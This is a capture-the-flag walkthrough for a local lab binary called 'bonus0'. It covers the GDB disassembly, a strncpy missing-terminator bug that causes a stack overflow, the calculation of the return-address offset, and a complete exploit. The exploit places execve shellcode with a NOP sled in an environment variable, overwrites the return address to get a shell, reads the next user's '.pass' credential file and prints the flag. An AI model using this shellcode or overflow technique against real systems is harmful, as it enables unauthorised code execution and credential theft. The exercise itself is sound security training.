# Bonus 0

## Connect to the virtual machine with SSH

Use the flag from `level9` as the `bonus0` password:

```bash
ssh bonus0@127.0.0.1 -p 2223
```

## Copy the binary to the host machine

From the root of this repository on the host:

```bash
scp -P 2223 bonus0@127.0.0.1:/home/user/bonus0/bonus0 ./bonus0/
```

The extracted binary is saved as `bonus0/bonus0`.

## Copy the GDB dump to the host

Inside the VM, connected as `bonus0`, open the binary with GDB:

```bash
gdb ./bonus0
```

Then enter:

```gdb
set disassembly-flavor intel
set pagination off
set logging file /tmp/bonus0_main_dump_gdb
set logging overwrite on
set logging on
disas main
disas pp
disas p
set logging off
quit
```

Then copy the dump back from the host:

```bash
scp -P 2223 bonus0@127.0.0.1:/tmp/bonus0_main_dump_gdb ./bonus0/
```

Since the binary is already on the host, the same dump can also be generated
locally:

```bash
gdb -q -batch \
  -ex "set disassembly-flavor intel" \
  -ex "disassemble main" \
  -ex "disassemble pp" \
  -ex "disassemble p" \
  ./bonus0/bonus0 > ./bonus0/bonus0_main_dump_gdb
```

## Analyze the GDB dump

`main` creates a buffer and passes it to `pp`:

```asm
0x080485aa <+6>:  sub    esp,0x40
0x080485ad <+9>:  lea    eax,[esp+0x16]
0x080485b4 <+16>: call   0x804851e <pp>
0x080485c0 <+28>: call   0x80483b0 <puts@plt>
```

`pp` creates two local buffers, calls `p` twice, then concatenates both strings
into the buffer from `main`:

```asm
0x0804852e <+16>: lea    eax,[ebp-0x30]
0x08048534 <+22>: call   0x80484b4 <p>
0x08048541 <+35>: lea    eax,[ebp-0x1c]
0x08048547 <+41>: call   0x80484b4 <p>
0x08048559 <+59>: call   0x80483a0 <strcpy@plt>
...
0x08048598 <+122>: call  0x8048390 <strcat@plt>
```

`p` reads up to `0x1000` bytes, cuts the string at the newline, then copies only
20 bytes into the destination:

```asm
0x080484e1 <+45>: call   0x8048380 <read@plt>
0x080484f7 <+67>: call   0x80483d0 <strchr@plt>
0x080484fc <+72>: mov    BYTE PTR [eax],0x0
0x08048517 <+99>: call   0x80483f0 <strncpy@plt>
```

The important bug is `strncpy(dst, src, 20)`. If the input is exactly 20 bytes,
`strncpy` does not append a null byte. So the first string in `pp` can run into
the second local string when `strcpy` copies it into `main`'s buffer.

## Find the exact offset

Break in `main` just after `pp` returns and inspect the distance from the final
buffer to the saved return address:

```gdb
break *main+21
run
p/x $ebp+4
p/x $esp+0x16
p/d ($ebp+4)-($esp+0x16)
```

Enter two 20-byte test strings when prompted:

```text
AAAAAAAAAAAAAAAAAAAA
BBBBBBBBBBBBBBBBBBBB
```

Result:

```text
Breakpoint 1, 0x080485b9 in main ()
$1 = 0xbffffc3c
$2 = 0xbffffc06
$3 = 54
```

So `main`'s saved return address is 54 bytes after the start of its final
buffer.

## Build the exploit

The binary has NX disabled, so we can jump to shellcode. To avoid depending on
the exact stack-buffer address, place shellcode in an environment variable with
a large NOP sled:

```bash
export SC=$(perl -e 'print "\x90" x 1000 . "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
```

In GDB, load the binary and stop at `main` before asking for the environment
variable address:

```gdb
break main
run
p/x (char *)getenv("SC")
```

Result:

```text
$1 = 0xbffffb37
```

Because `SC` starts with a large NOP sled, returning to `0xbffffb37` reaches the
shellcode.

The first input must be exactly 20 bytes so it is not null-terminated:

```text
AAAAAAAAAAAAAAAAAAAA
```

The second input must place the return address at offset 54 in the final
buffer. In the final layout, offset 54 lands at byte 9 of the second input
when it is appended by `strcat`, so the second input is:

```text
9 padding bytes + 0xbffffb37 + 7 padding bytes
```

Address in little endian:

```text
0xbffffb37 -> \x37\xfb\xff\xbf
```

One more detail: `p` uses `read(0, 4096)`, not `fgets`. If both payload lines
are sent too quickly through a pipe, the first `read` can consume both lines.
Add a short `sleep` between the two lines so each call to `p` receives one
line.

## Exploitation

Run this in the VM:

```bash
export SC=$(perl -e 'print "\x90" x 1000 . "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
(python -c 'print "A" * 20'; sleep 0.2; python -c 'print "B" * 9 + "\x37\xfb\xff\xbf" + "C" * 7'; cat) | /home/user/bonus0/bonus0
```

The `cat` keeps stdin open for the shell.

Check the effective identity:

```bash
whoami
```

Result:

```text
bonus1
```

Read the next password:

```bash
cat /home/user/bonus1/.pass
```

## Flag

```text
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
